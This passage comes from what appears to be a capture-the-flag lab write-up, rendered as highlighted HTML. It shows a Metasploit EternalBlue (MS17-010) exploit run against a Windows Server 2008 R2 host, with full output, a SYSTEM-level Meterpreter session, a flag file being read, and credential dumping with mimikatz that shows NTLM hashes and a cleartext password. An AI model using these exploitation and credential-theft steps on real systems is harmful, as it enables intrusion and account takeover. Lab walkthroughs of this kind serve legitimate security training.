matches exploit Target. Only affects Window<br>                                             s Server <span class="hljs-number">2008</span> R2, Windows <span class="hljs-number">7</span>, Windows Embedded Standard <span class="hljs-number">7</span> target machines<br>                                             .<br>   VERIFY_TARGET  true             yes       Check <span class="hljs-keyword">if</span> remote OS matches exploit Target. Only affects Windows Server <span class="hljs-number">2</span><br>                                             <span class="hljs-number">008</span> R2, Windows <span class="hljs-number">7</span>, Windows Embedded Standard <span class="hljs-number">7</span> target machines.<br><br><br>Payload options (windows/x64/meterpreter/bind_tcp):<br><br>   Name      Current Setting  Required  Description<br>   ----      ---------------  --------  -----------<br>   EXITFUNC  thread           yes       Exit technique (Accepted: <span class="hljs-string">&#x27;&#x27;</span>, seh, thread, process, none)<br>   LPORT     <span class="hljs-number">4444</span>             yes       The listen port<br>   RHOST                      no        The target address<br><br><br>Exploit target:<br><br>   Id  Name<br>   --  ----<br>   <span class="hljs-number">0</span>   Automatic Target<br><br><br><br>View the full <span class="hljs-keyword">module</span> info <span class="hljs-keyword">with</span> the info, or info -d command.<br><br>msf exploit(windows/smb/ms17_010_eternalblue) &gt; set RHOSTS <span class="hljs-number">172.22</span><span class="hljs-number">.11</span><span class="hljs-number">.45</span><br>RHOSTS =&gt; <span class="hljs-number">172.22</span><span class="hljs-number">.11</span><span class="hljs-number">.45</span><br>msf exploit(windows/smb/ms17_010_eternalblue) &gt; run<br>[*] <span class="hljs-number">172.22</span><span class="hljs-number">.11</span><span class="hljs-number">.45</span>:<span class="hljs-number">445</span> - Using auxiliary/scanner/smb/smb_ms17_010 <span class="hljs-keyword">as</span> check<br>[+] <span class="hljs-number">172.22</span><span class="hljs-number">.11</span><span class="hljs-number">.45</span>:<span class="hljs-number">445</span>      - Host is likely VULNERABLE to MS17<span class="hljs-number">-010</span>! - Windows Server <span class="hljs-number">2008</span> R2 Enterprise <span class="hljs-number">7601</span> Service Pack <span class="hljs-number">1</span> x64 (<span class="hljs-number">64</span>-bit)<br>[*] <span class="hljs-number">172.22</span><span class="hljs-number">.11</span><span class="hljs-number">.45</span>:<span class="hljs-number">445</span>      - Scanned <span class="hljs-number">1</span> <span class="hljs-keyword">of</span> <span class="hljs-number">1</span> hosts (<span class="hljs-number">100</span>% complete)<br>[+] <span class="hljs-number">172.22</span><span class="hljs-number">.11</span><span class="hljs-number">.45</span>:<span class="hljs-number">445</span> - The target is vulnerable.<br>[*] <span class="hljs-number">172.22</span><span class="hljs-number">.11</span><span class="hljs-number">.45</span>:<span class="hljs-number">445</span> - Connecting to target for exploitation.<br>[+] <span class="hljs-number">172.22</span><span class="hljs-number">.11</span><span class="hljs-number">.45</span>:<span class="hljs-number">445</span> - Connection established for exploitation.<br>[+] <span class="hljs-number">172.22</span><span class="hljs-number">.11</span><span class="hljs-number">.45</span>:<span class="hljs-number">445</span> - Target OS selected valid for OS indicated by SMB reply<br>[*] <span class="hljs-number">172.22</span><span class="hljs-number">.11</span><span class="hljs-number">.45</span>:<span class="hljs-number">445</span> - CORE raw buffer dump (<span class="hljs-number">53</span> bytes)<br>[*] <span class="hljs-number">172.22</span><span class="hljs-number">.11</span><span class="hljs-number">.45</span>:<span class="hljs-number">445</span> - <span class="hljs-number">0x00000000</span>  <span class="hljs-number">57</span> <span class="hljs-number">69</span> <span class="hljs-number">6</span>e <span class="hljs-number">64</span> <span class="hljs-number">6</span>f <span class="hljs-number">77</span> <span class="hljs-number">73</span> <span class="hljs-number">20</span> <span class="hljs-number">53</span> <span class="hljs-number">65</span> <span class="hljs-number">72</span> <span class="hljs-number">76</span> <span class="hljs-number">65</span> <span class="hljs-number">72</span> <span class="hljs-number">20</span> <span class="hljs-number">32</span>  Windows Server <span class="hljs-number">2</span><br>[*] <span class="hljs-number">172.22</span><span class="hljs-number">.11</span><span class="hljs-number">.45</span>:<span class="hljs-number">445</span> - <span class="hljs-number">0x00000010</span>  <span class="hljs-number">30</span> <span class="hljs-number">30</span> <span class="hljs-number">38</span> <span class="hljs-number">20</span> <span class="hljs-number">52</span> <span class="hljs-number">32</span> <span class="hljs-number">20</span> <span class="hljs-number">45</span> <span class="hljs-number">6</span>e <span class="hljs-number">74</span> <span class="hljs-number">65</span> <span class="hljs-number">72</span> <span class="hljs-number">70</span> <span class="hljs-number">72</span> <span class="hljs-number">69</span> <span class="hljs-number">73</span>  <span class="hljs-number">008</span> R2 Enterpris<br>[*] <span class="hljs-number">172.22</span><span class="hljs-number">.11</span><span class="hljs-number">.45</span>:<span class="hljs-number">445</span> - <span class="hljs-number">0x00000020</span>  <span class="hljs-number">65</span> <span class="hljs-number">20</span> <span class="hljs-number">37</span> <span class="hljs-number">36</span> <span class="hljs-number">30</span> <span class="hljs-number">31</span> <span class="hljs-number">20</span> <span class="hljs-number">53</span> <span class="hljs-number">65</span> <span class="hljs-number">72</span> <span class="hljs-number">76</span> <span class="hljs-number">69</span> <span class="hljs-number">63</span> <span class="hljs-number">65</span> <span class="hljs-number">20</span> <span class="hljs-number">50</span>  e <span class="hljs-number">7601</span> Service P<br>[*] <span class="hljs-number">172.22</span><span class="hljs-number">.11</span><span class="hljs-number">.45</span>:<span class="hljs-number">445</span> - <span class="hljs-number">0x00000030</span>  <span class="hljs-number">61</span> <span class="hljs-number">63</span> <span class="hljs-number">6</span>b <span class="hljs-number">20</span> <span class="hljs-number">31</span>                                   ack <span class="hljs-number">1</span><br>[+] <span class="hljs-number">172.22</span><span class="hljs-number">.11</span><span class="hljs-number">.45</span>:<span class="hljs-number">445</span> - Target arch selected valid for arch indicated by DCE/RPC reply<br>[*] <span class="hljs-number">172.22</span><span class="hljs-number">.11</span><span class="hljs-number">.45</span>:<span class="hljs-number">445</span> - Trying exploit <span class="hljs-keyword">with</span> <span class="hljs-number">12</span> Groom Allocations.<br>[*] <span class="hljs-number">172.22</span><span class="hljs-number">.11</span><span class="hljs-number">.45</span>:<span class="hljs-number">445</span> - Sending all but last fragment <span class="hljs-keyword">of</span> exploit packet<br>[*] <span class="hljs-number">172.22</span><span class="hljs-number">.11</span><span class="hljs-number">.45</span>:<span class="hljs-number">445</span> - Starting non-paged pool grooming<br>[+] <span class="hljs-number">172.22</span><span class="hljs-number">.11</span><span class="hljs-number">.45</span>:<span class="hljs-number">445</span> - Sending SMBv2 buffers<br>[+] <span class="hljs-number">172.22</span><span class="hljs-number">.11</span><span class="hljs-number">.45</span>:<span class="hljs-number">445</span> - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.<br>[*] <span class="hljs-number">172.22</span><span class="hljs-number">.11</span><span class="hljs-number">.45</span>:<span class="hljs-number">445</span> - Sending final SMBv2 buffers.<br>[*] <span class="hljs-number">172.22</span><span class="hljs-number">.11</span><span class="hljs-number">.45</span>:<span class="hljs-number">445</span> - Sending last fragment <span class="hljs-keyword">of</span> exploit packet!<br>[*] <span class="hljs-number">172.22</span><span class="hljs-number">.11</span><span class="hljs-number">.45</span>:<span class="hljs-number">445</span> - Receiving response <span class="hljs-keyword">from</span> exploit packet<br>[+] <span class="hljs-number">172.22</span><span class="hljs-number">.11</span><span class="hljs-number">.45</span>:<span class="hljs-number">445</span> - ETERNALBLUE overwrite completed successfully (<span class="hljs-number">0xC000000D</span>)!<br>[*] <span class="hljs-number">172.22</span><span class="hljs-number">.11</span><span class="hljs-number">.45</span>:<span class="hljs-number">445</span> - Sending egg to corrupted connection.<br>[*] <span class="hljs-number">172.22</span><span class="hljs-number">.11</span><span class="hljs-number">.45</span>:<span class="hljs-number">445</span> - Triggering free <span class="hljs-keyword">of</span> corrupted buffer.<br>[*] Started bind TCP handler against <span class="hljs-number">172.22</span><span class="hljs-number">.11</span><span class="hljs-number">.45</span>:<span class="hljs-number">4444</span><br>[-] <span class="hljs-number">172.22</span><span class="hljs-number">.11</span><span class="hljs-number">.45</span>:<span class="hljs-number">445</span> - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=<br>[-] <span class="hljs-number">172.22</span><span class="hljs-number">.11</span><span class="hljs-number">.45</span>:<span class="hljs-number">445</span> - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=<br>[-] <span class="hljs-number">172.22</span><span class="hljs-number">.11</span><span class="hljs-number">.45</span>:<span class="hljs-number">445</span> - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=<br>[*] <span class="hljs-number">172.22</span><span class="hljs-number">.11</span><span class="hljs-number">.45</span>:<span class="hljs-number">445</span> - Connecting to target for exploitation.<br>[+] <span class="hljs-number">172.22</span><span class="hljs-number">.11</span><span class="hljs-number">.45</span>:<span class="hljs-number">445</span> - Connection established for exploitation.<br>[+] <span class="hljs-number">172.22</span><span class="hljs-number">.11</span><span class="hljs-number">.45</span>:<span class="hljs-number">445</span> - Target OS selected valid for OS indicated by SMB reply<br>[*] <span class="hljs-number">172.22</span><span class="hljs-number">.11</span><span class="hljs-number">.45</span>:<span class="hljs-number">445</span> - CORE raw buffer dump (<span class="hljs-number">53</span> bytes)<br>[*] <span class="hljs-number">172.22</span><span class="hljs-number">.11</span><span class="hljs-number">.45</span>:<span class="hljs-number">445</span> - <span class="hljs-number">0x00000000</span>  <span class="hljs-number">57</span> <span class="hljs-number">69</span> <span class="hljs-number">6</span>e <span class="hljs-number">64</span> <span class="hljs-number">6</span>f <span class="hljs-number">77</span> <span class="hljs-number">73</span> <span class="hljs-number">20</span> <span class="hljs-number">53</span> <span class="hljs-number">65</span> <span class="hljs-number">72</span> <span class="hljs-number">76</span> <span class="hljs-number">65</span> <span class="hljs-number">72</span> <span class="hljs-number">20</span> <span class="hljs-number">32</span>  Windows Server <span class="hljs-number">2</span><br>[*] <span class="hljs-number">172.22</span><span class="hljs-number">.11</span><span class="hljs-number">.45</span>:<span class="hljs-number">445</span> - <span class="hljs-number">0x00000010</span>  <span class="hljs-number">30</span> <span class="hljs-number">30</span> <span class="hljs-number">38</span> <span class="hljs-number">20</span> <span class="hljs-number">52</span> <span class="hljs-number">32</span> <span class="hljs-number">20</span> <span class="hljs-number">45</span> <span class="hljs-number">6</span>e <span class="hljs-number">74</span> <span class="hljs-number">65</span> <span class="hljs-number">72</span> <span class="hljs-number">70</span> <span class="hljs-number">72</span> <span class="hljs-number">69</span> <span class="hljs-number">73</span>  <span class="hljs-number">008</span> R2 Enterpris<br>[*] <span class="hljs-number">172.22</span><span class="hljs-number">.11</span><span class="hljs-number">.45</span>:<span class="hljs-number">445</span> - <span class="hljs-number">0x00000020</span>  <span class="hljs-number">65</span> <span class="hljs-number">20</span> <span class="hljs-number">37</span> <span class="hljs-number">36</span> <span class="hljs-number">30</span> <span class="hljs-number">31</span> <span class="hljs-number">20</span> <span class="hljs-number">53</span> <span class="hljs-number">65</span> <span class="hljs-number">72</span> <span class="hljs-number">76</span> <span class="hljs-number">69</span> <span class="hljs-number">63</span> <span class="hljs-number">65</span> <span class="hljs-number">20</span> <span class="hljs-number">50</span>  e <span class="hljs-number">7601</span> Service P<br>[*] <span class="hljs-number">172.22</span><span class="hljs-number">.11</span><span class="hljs-number">.45</span>:<span class="hljs-number">445</span> - <span class="hljs-number">0x00000030</span>  <span class="hljs-number">61</span> <span class="hljs-number">63</span> <span class="hljs-number">6</span>b <span class="hljs-number">20</span> <span class="hljs-number">31</span>                                   ack <span class="hljs-number">1</span><br>[+] <span class="hljs-number">172.22</span><span class="hljs-number">.11</span><span class="hljs-number">.45</span>:<span class="hljs-number">445</span> - Target arch selected valid for arch indicated by DCE/RPC reply<br>[*] <span class="hljs-number">172.22</span><span class="hljs-number">.11</span><span class="hljs-number">.45</span>:<span class="hljs-number">445</span> - Trying exploit <span class="hljs-keyword">with</span> <span class="hljs-number">17</span> Groom Allocations.<br>[*] <span class="hljs-number">172.22</span><span class="hljs-number">.11</span><span class="hljs-number">.45</span>:<span class="hljs-number">445</span> - Sending all but last fragment <span class="hljs-keyword">of</span> exploit packet<br>[*] <span class="hljs-number">172.22</span><span class="hljs-number">.11</span><span class="hljs-number">.45</span>:<span class="hljs-number">445</span> - Starting non-paged pool grooming<br>[+] <span class="hljs-number">172.22</span><span class="hljs-number">.11</span><span class="hljs-number">.45</span>:<span class="hljs-number">445</span> - Sending SMBv2 buffers<br>[+] <span class="hljs-number">172.22</span><span class="hljs-number">.11</span><span class="hljs-number">.45</span>:<span class="hljs-number">445</span> - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.<br>[*] <span class="hljs-number">172.22</span><span class="hljs-number">.11</span><span class="hljs-number">.45</span>:<span class="hljs-number">445</span> - Sending final SMBv2 buffers.<br>[*] <span class="hljs-number">172.22</span><span class="hljs-number">.11</span><span class="hljs-number">.45</span>:<span class="hljs-number">445</span> - Sending last fragment <span class="hljs-keyword">of</span> exploit packet!<br>[*] <span class="hljs-number">172.22</span><span class="hljs-number">.11</span><span class="hljs-number">.45</span>:<span class="hljs-number">445</span> - Receiving response <span class="hljs-keyword">from</span> exploit packet<br>[+] <span class="hljs-number">172.22</span><span class="hljs-number">.11</span><span class="hljs-number">.45</span>:<span class="hljs-number">445</span> - ETERNALBLUE overwrite completed successfully (<span class="hljs-number">0xC000000D</span>)!<br>[*] <span class="hljs-number">172.22</span><span class="hljs-number">.11</span><span class="hljs-number">.45</span>:<span class="hljs-number">445</span> - Sending egg to corrupted connection.<br>[*] <span class="hljs-number">172.22</span><span class="hljs-number">.11</span><span class="hljs-number">.45</span>:<span class="hljs-number">445</span> - Triggering free <span class="hljs-keyword">of</span> corrupted buffer.<br>[*] Sending stage (<span class="hljs-number">230982</span> bytes) to <span class="hljs-number">172.22</span><span class="hljs-number">.11</span><span class="hljs-number">.45</span><br>[*] Meterpreter session <span class="hljs-number">1</span> opened (<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">19771</span> -&gt; <span class="hljs-number">172.22</span><span class="hljs-number">.11</span><span class="hljs-number">.45</span>:<span class="hljs-number">4444</span>) at <span class="hljs-number">2026</span><span class="hljs-number">-03</span><span class="hljs-number">-17</span> <span class="hljs-number">14</span>:<span class="hljs-number">47</span>:<span class="hljs-number">16</span> +<span class="hljs-number">0800</span><br>[+] <span class="hljs-number">172.22</span><span class="hljs-number">.11</span><span class="hljs-number">.45</span>:<span class="hljs-number">445</span> - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=<br>[+] <span class="hljs-number">172.22</span><span class="hljs-number">.11</span><span class="hljs-number">.45</span>:<span class="hljs-number">445</span> - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=<br>[+] <span class="hljs-number">172.22</span><span class="hljs-number">.11</span><span class="hljs-number">.45</span>:<span class="hljs-number">445</span> - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=<br><br>meterpreter &gt; setuid<br>[-] Unknown command: setuid. Did you mean getuid? Run the help command for more details.<br>meterpreter &gt; getuid<br>Server username: NT AUTHORITY\SYSTEM<br>meterpreter &gt; shell<br>Process <span class="hljs-number">1048</span> created.<br>Channel <span class="hljs-number">1</span> created.<br>Microsoft Windows [�汾 <span class="hljs-number">6.1</span><span class="hljs-number">.7601</span>]<br>��Ȩ���� (c) <span class="hljs-number">2009</span> Microsoft Corporation����������Ȩ����<br><br>C:\Windows\system32&gt;dir C:\ /S /B|findstr flag<br>dir C:\ /S /B|findstr flag<br>C:\Users\Administrator\flag<br>C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\flag.lnk<br>C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Recent\flag02.txt.lnk<br>C:\Users\Administrator\flag\flag02.txt<br><br>C:\Windows\system32&gt;type C:\Users\Administrator\flag\flag02.txt<br>type C:\Users\Administrator\flag\flag02.txt<br>                                                      ##<br>  :####:                                   :####      ##<br> :######                                   #####      ##<br> ##:  :#                                   ##<br> ##        ##.###:    .####.    .####.   #######    ####     ##.####    :###:##<br> ###:      #######:  .######.  .######.  #######    ####     #######   .#######<br> :#####:   ###  ###  ###  ###  ###  ###    ##         ##     ###  :##  ###  ###<br>  .#####:  ##.  .##  ##.  .##  ##.  .##    ##         ##     ##    ##  ##.  .##<br>     :###  ##    ##  ##    ##  ##    ##    ##         ##     ##    ##  ##    ##<br>       ##  ##.  .##  ##.  .##  ##.  .##    ##         ##     ##    ##  ##.  .##<br> #:.  :##  ###  ###  ###  ###  ###  ###    ##         ##     ##    ##  ###  ###<br> #######:  #######:  .######.  .######.    ##      ########  ##    ##  .#######<br> .#####:   ##.###:    .####.    .####.     ##      ########  ##    ##   :###:##<br>           ##                                                           #.  :##<br>           ##                                                           ######<br>           ##                                                           :####:<br><br><br>flag02: flag&#123;<span class="hljs-number">35</span>b58432-e4e2<span class="hljs-number">-499</span>a<span class="hljs-number">-9e51</span><span class="hljs-number">-9</span>d230e3fa788&#125;<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">meterpreter</span> &gt; load kiwi<br><span class="hljs-symbol">Loading</span> extension kiwi...<br>  .#####.   mimikatz <span class="hljs-number">2</span>.<span class="hljs-number">2</span>.<span class="hljs-number">0</span> <span class="hljs-number">20191125</span> (x64/windows)<br> .## ^ ##.  <span class="hljs-string">&quot;A La Vie, A L&#x27;Amour&quot;</span> - (oe.eo)<br> <span class="hljs-comment">## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )</span><br> <span class="hljs-comment">## \ / ##       &gt; http://blog.gentilkiwi.com/mimikatz</span><br> <span class="hljs-string">&#x27;## v ##&#x27;</span>        Vincent LE TOUX            ( vincent.letoux<span class="hljs-comment">@gmail.com )</span><br>  <span class="hljs-string">&#x27;#####&#x27;</span>         &gt; http:<span class="hljs-comment">//pingcastle.com / http://mysmartlogon.com  ***/</span><br><br><span class="hljs-symbol">Success.</span><br><span class="hljs-symbol">Kiwi</span> Commands<br>=============<br><br>    Command                   Description<br>    -------                   -----------<br>    creds_all                 Retrieve all credentials (parsed)<br>    creds_kerberos            Retrieve Kerberos creds (parsed)<br>    creds_livessp             Retrieve Live SSP creds<br>    creds_msv                 Retrieve LM/NTLM creds (parsed)<br>    creds_ssp                 Retrieve SSP creds<br>    creds_tspkg               Retrieve TsPkg creds (parsed)<br>    creds_wdigest             Retrieve WDigest creds (parsed)<br>    dcsync                    Retrieve user account information via DCSync (unparsed)<br>    dcsync_ntlm               Retrieve user account NTLM hash, SID <span class="hljs-keyword">and</span> RID via DCSync<br>    golden_ticket_create      Create a golden kerberos ticket<br>    kerberos_ticket_list      List all kerberos tickets (unparsed)<br>    kerberos_ticket_purge     Purge any in-use kerberos tickets<br>    kerberos_ticket_use       Use a kerberos ticket<br>    kiwi_cmd                  Execute an arbitrary mimikatz command (unparsed)<br>    lsa_dump_sam              Dump LSA SAM (unparsed)<br>    lsa_dump_secrets          Dump LSA secrets (unparsed)<br>    password_change           Change the password/hash of a user<br>    wifi_list                 List wifi profiles/creds for the current user<br>    wifi_list_shared          List shared wifi profiles/creds (requires SYSTEM)<br><br><span class="hljs-symbol">For</span> more <span class="hljs-meta">info</span> on a specific command, use &lt;command&gt; -h or help &lt;command&gt;.<br><br><span class="hljs-symbol">meterpreter</span> &gt; creds_all<br>[+] Running as SYSTEM<br>[*] Retrieving all credentials<br><span class="hljs-symbol">msv</span> credentials<br>===============<br><br><span class="hljs-symbol">Username</span>     Domain    NTLM                              SHA1<br>--------     ------    ----                              ----<br><span class="hljs-symbol">XR</span>-DESKTOP$  XIAORANG  <span class="hljs-number">28035770</span>f3abf147ec6a1ed6c2c237da  c987442fad0a0d1eb4a4ec1879a53980f74412f7<br><span class="hljs-symbol">yangmei</span>      XIAORANG  <span class="hljs-number">25</span>e42ef4cc0ab6a8ff9e3edbbda91841  <span class="hljs-number">6</span>b2838f81b57faed5d860adaf9401b0edb269a6f<br><br><span class="hljs-symbol">wdigest</span> credentials<br>===================<br><br><span class="hljs-symbol">Username</span>     Domain    Password<br>--------     ------    --------<br>(null)       (null)    (null)<br><span class="hljs-symbol">XR</span>-DESKTOP$  XIAORANG  <span class="hljs-number">88</span> <span class="hljs-number">92</span> ee bc <span class="hljs-number">6</span>e <span class="hljs-number">2</span>b <span class="hljs-number">28</span> <span class="hljs-built_in">c8</span> a0 <span class="hljs-number">15</span> b5 <span class="hljs-number">8</span>d da <span class="hljs-number">30</span> aa af ce <span class="hljs-number">47</span> <span class="hljs-number">32</span> <span class="hljs-number">4</span>c <span class="hljs-number">19</span> fc b2 df <span class="hljs-built_in">c0</span> <span class="hljs-number">04</span> bf b3 <span class="hljs-number">4</span>f <span class="hljs-number">55</span> <span class="hljs-number">85</span> cc <span class="hljs-number">6</span>e <span class="hljs-number">5</span>c <span class="hljs-number">79</span> a<br>                       <span class="hljs-number">8</span> <span class="hljs-number">11</span> <span class="hljs-number">7</span>d ff e7 <span class="hljs-built_in">f4</span> b6 <span class="hljs-number">3</span>d <span class="hljs-number">21</span> b2 bd a6 <span class="hljs-number">62</span> af <span class="hljs-number">83</span> <span class="hljs-number">5</span>e <span class="hljs-number">0</span>d <span class="hljs-number">6</span>e <span class="hljs-number">17</span> af <span class="hljs-number">8</span>b <span class="hljs-number">1</span>d <span class="hljs-number">14</span> ec da <span class="hljs-number">4</span>d <span class="hljs-number">69</span> <span class="hljs-number">71</span> <span class="hljs-built_in">d8</span> <span class="hljs-number">63</span> <span class="hljs-number">36</span> <span class="hljs-number">65</span> <span class="hljs-number">02</span> <span class="hljs-number">57</span> <span class="hljs-number">77</span> <span class="hljs-built_in">a1</span><br>                        <span class="hljs-number">4</span>e dc <span class="hljs-built_in">a2</span> <span class="hljs-number">0</span>d <span class="hljs-number">0</span>f <span class="hljs-number">06</span> <span class="hljs-number">28</span> a8 <span class="hljs-built_in">c6</span> ed <span class="hljs-number">75</span> <span class="hljs-number">3</span>b e5 b8 <span class="hljs-built_in">c4</span> <span class="hljs-number">3</span>a <span class="hljs-number">36</span> <span class="hljs-number">4</span>d <span class="hljs-number">68</span> <span class="hljs-number">65</span> f9 <span class="hljs-number">0</span>e bd <span class="hljs-number">95</span> aa <span class="hljs-number">5</span>e <span class="hljs-number">02</span> <span class="hljs-number">11</span> <span class="hljs-number">76</span> bf <span class="hljs-built_in">f0</span> <span class="hljs-number">1</span>a df <span class="hljs-number">9</span>d b2<br>                       <span class="hljs-number">5</span>d <span class="hljs-number">32</span> <span class="hljs-number">6</span>a <span class="hljs-number">4</span>a b7 <span class="hljs-built_in">c7</span> ab <span class="hljs-number">2</span>c <span class="hljs-number">70</span> <span class="hljs-number">18</span> <span class="hljs-number">47</span> <span class="hljs-number">21</span> <span class="hljs-number">4</span>a <span class="hljs-number">00</span> a8 <span class="hljs-number">77</span> <span class="hljs-number">1</span>e <span class="hljs-number">21</span> e4 <span class="hljs-number">00</span> <span class="hljs-number">84</span> <span class="hljs-number">2</span>f <span class="hljs-built_in">d8</span> aa <span class="hljs-number">04</span> <span class="hljs-number">02</span> <span class="hljs-number">7</span>b <span class="hljs-number">42</span> ed fa <span class="hljs-number">25</span> de da fd e8 <span class="hljs-number">8</span><br>                       <span class="hljs-number">1</span> de b7 <span class="hljs-number">7</span>e <span class="hljs-number">82</span> <span class="hljs-number">9</span>d f9 <span class="hljs-number">55</span> <span class="hljs-number">6</span>a cb be <span class="hljs-number">73</span> b7 <span class="hljs-number">39</span> af df <span class="hljs-number">0</span>b <span class="hljs-number">48</span> <span class="hljs-number">37</span> aa a5 <span class="hljs-number">9</span>b <span class="hljs-number">5</span>d <span class="hljs-number">93</span> <span class="hljs-number">23</span> <span class="hljs-built_in">c6</span> <span class="hljs-number">20</span> <span class="hljs-number">77</span> <span class="hljs-number">7</span>f <span class="hljs-number">26</span> <span class="hljs-built_in">c8</span> <span class="hljs-number">40</span> <span class="hljs-number">84</span> <span class="hljs-built_in">c0</span> <span class="hljs-number">27</span> <span class="hljs-number">5</span>b<br>                        <span class="hljs-number">1</span>f <span class="hljs-number">20</span> <span class="hljs-number">44</span> <span class="hljs-built_in">d9</span> <span class="hljs-number">73</span> <span class="hljs-number">61</span> e9 cf <span class="hljs-number">0</span>f <span class="hljs-number">16</span> <span class="hljs-number">5</span>b <span class="hljs-number">98</span> <span class="hljs-built_in">c1</span> <span class="hljs-number">9</span>d <span class="hljs-number">5</span>a <span class="hljs-number">26</span> <span class="hljs-number">0</span>b <span class="hljs-number">47</span> <span class="hljs-number">68</span> <span class="hljs-number">34</span> <span class="hljs-number">09</span> dc <span class="hljs-number">68</span> <span class="hljs-number">0</span>f <span class="hljs-number">90</span> <span class="hljs-built_in">d6</span> <span class="hljs-built_in">d1</span> <span class="hljs-number">05</span> <span class="hljs-built_in">d4</span> <span class="hljs-number">97</span> <span class="hljs-number">62</span> e2 <span class="hljs-number">4</span>d <span class="hljs-number">6</span>a <span class="hljs-number">7</span>c<br>                       <span class="hljs-number">01</span> e4 <span class="hljs-number">74</span> <span class="hljs-number">48</span> <span class="hljs-number">3</span>a bf <span class="hljs-number">42</span> b8 <span class="hljs-number">50</span> fa <span class="hljs-number">2</span>a b3 <span class="hljs-number">19</span> <span class="hljs-number">65</span> <span class="hljs-built_in">d9</span> e9 a7 <span class="hljs-number">2</span>d <span class="hljs-number">38</span> <span class="hljs-number">52</span> <span class="hljs-number">03</span> <span class="hljs-number">68</span> e8 <span class="hljs-number">45</span> ef <span class="hljs-built_in">f7</span> <span class="hljs-number">3</span>d <span class="hljs-number">55</span><br><span class="hljs-symbol">yangmei</span>      XIAORANG  xrihGHgoNZQ<br><br><span class="hljs-symbol">kerberos</span> credentials<br>====================<br><br><span class="hljs-symbol">Username</span>     Domain        Password<br>--------     ------        --------<br>(null)       (null)        (null)<br><span class="hljs-symbol">xr</span>-desktop$  XIAORANG.LAB  (null)<br><span class="hljs-symbol">xr</span>-desktop$  XIAORANG.LAB  <span class="hljs-number">88</span> <span class="hljs-number">92</span> ee bc <span class="hljs-number">6</span>e <span class="hljs-number">2</span>b <span class="hljs-number">28</span> <span class="hljs-built_in">c8</span> a0 <span class="hljs-number">15</span> b5 <span class="hljs-number">8</span>d da <span class="hljs-number">30</span> aa af ce <span class="hljs-number">47</span> <span class="hljs-number">32</span> <span class="hljs-number">4</span>c <span class="hljs-number">19</span> fc b2 df <span class="hljs-built_in">c0</span> <span class="hljs-number">04</span> bf b3 <span class="hljs-number">4</span>f <span class="hljs-number">55</span> <span class="hljs-number">85</span> cc <span class="hljs-number">6</span>e <span class="hljs-number">5</span>c<br>                           <span class="hljs-number">79</span> a8 <span class="hljs-number">11</span> <span class="hljs-number">7</span>d ff e7 <span class="hljs-built_in">f4</span> b6 <span class="hljs-number">3</span>d <span class="hljs-number">21</span> b2 bd a6 <span class="hljs-number">62</span> af <span class="hljs-number">83</span> <span class="hljs-number">5</span>e <span class="hljs-number">0</span>d <span class="hljs-number">6</span>e <span class="hljs-number">17</span> af <span class="hljs-number">8</span>b <span class="hljs-number">1</span>d <span class="hljs-number">14</span> ec da <span class="hljs-number">4</span>d <span class="hljs-number">69</span> <span class="hljs-number">71</span> <span class="hljs-built_in">d8</span> <span class="hljs-number">63</span> <span class="hljs-number">36</span> <span class="hljs-number">65</span> <span class="hljs-number">02</span><br>                           <span class="hljs-number">57</span> <span class="hljs-number">77</span> <span class="hljs-built_in">a1</span> <span class="hljs-number">4</span>e dc <span class="hljs-built_in">a2</span> <span class="hljs-number">0</span>d <span class="hljs-number">0</span>f <span class="hljs-number">06</span> <span class="hljs-number">28</span> a8 <span class="hljs-built_in">c6</span> ed <span class="hljs-number">75</span> <span class="hljs-number">3</span>b e5 b8 <span class="hljs-built_in">c4</span> <span class="hljs-number">3</span>a <span class="hljs-number">36</span> <span class="hljs-number">4</span>d <span 